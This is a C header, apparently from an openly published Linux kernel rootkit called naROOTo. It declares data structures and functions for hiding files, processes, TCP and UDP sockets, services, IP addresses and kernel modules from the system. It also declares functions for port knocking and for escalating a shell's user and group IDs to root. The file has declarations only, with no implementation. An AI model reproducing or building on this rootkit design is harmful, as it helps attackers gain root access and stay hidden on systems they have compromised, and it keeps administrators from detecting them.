/*
 * This file is part of naROOTo.

 * naROOTo is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * naROOTo is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
 */

#ifndef CONTROL_HEADER
#define CONTROL_HEADER

#include "include.h"

/* list for hidden files (full path) */
struct file_name {
	struct list_head list;
	char name[1024];
};

/* list for hidden files (by prefix) */
struct file_prefix {
	struct list_head list;
	char name[64];
};

/* list for hidden processes (by pid) */
struct process {
	struct list_head list;
	pid_t pid;
};

/* list for hidden tcp sockets (by port) */
struct tcp_socket {
	struct list_head list;
	int port;
};

/* list for hidden udp sockets (by port) */
struct udp_socket {
	struct list_head list;
	int port;
};

/* list for tcp ports that use port knocking */
struct knocking_tcp_port {
	struct list_head list;
	int port;
};

/* list for udp ports that use port knocking */
struct knocking_udp_port {
	struct list_head list;
	int port;
};

/* list for hidden tcp services (by port) */
struct hidden_service {
	struct list_head list;
	int port;
};

/* list for hidden ip addresses */
struct hidden_ip {
	struct list_head list;
	__u32 ipaddr;
};

/* list for hidden kernel modules (by module name) */
// TODO: think of a better way to store hidden modules
struct modules {
	struct list_head list;
	char name[64];
};

/* list for ports with enabled port knocking */
struct port_knocking {
	struct list_head list;
	int port;		/* the port that is filtered */
	int protocol;		/* tcp or udp */
	int ipaddr;		/* the ip that is allowed to connect */
};

/* list for id's of the escalated shell*/
struct escalated_pid {
	struct list_head list;
	pid_t pid;
	int uid;
	int euid;
	int suid;
	int fsuid;
	int gid;
	int egid;
	int sgid;
	int fsgid;
};

/*
 * Functions for adding and removing certain objects from hiding
 */

int is_path_hidden(char *name);

int hide_file_path(char *name);

int unhide_file_path(char *name);

struct list_head *get_prefix_list(void);

int is_prefix_hidden(char *name);

int hide_file_prefix(char *name);

int unhide_file_prefix(char *name);

int is_process_hidden(pid_t pid);

int hide_process(pid_t pid);

int unhide_process(pid_t pid);

int is_tcp_socket_hidden(int port);

int hide_tcp_socket(int port);

int unhide_tcp_socket(int port);

int is_udp_socket_hidden(int port);

int hide_udp_socket(int port);

int unhide_udp_socket(int port);

int is_knocked_tcp(int port);

int enable_knocking_tcp(int port);

int disable_knocking_tcp(int port);

int is_knocked_udp(int port);

int enable_knocking_udp(int port);

int disable_knocking_udp(int port);

int is_service_hidden(int port);

int hide_service(int port);

int unhide_service(int port);

int is_ip_hidden(__u32 ipaddr);

int hide_ip_address(__u32 ipaddr);

int unhide_ip_address(__u32 ipaddr);

int is_module_hidden(char *name);

int hide_module(char *name);

int unhide_module(char *name);

struct escalated_pid *is_shell_escalated(pid_t pid);

int escalate(struct escalated_pid *);

int deescalate(pid_t pid);

int control_loaded(void);

void initialize_control(void);

void cleanup_control(void);

#endif
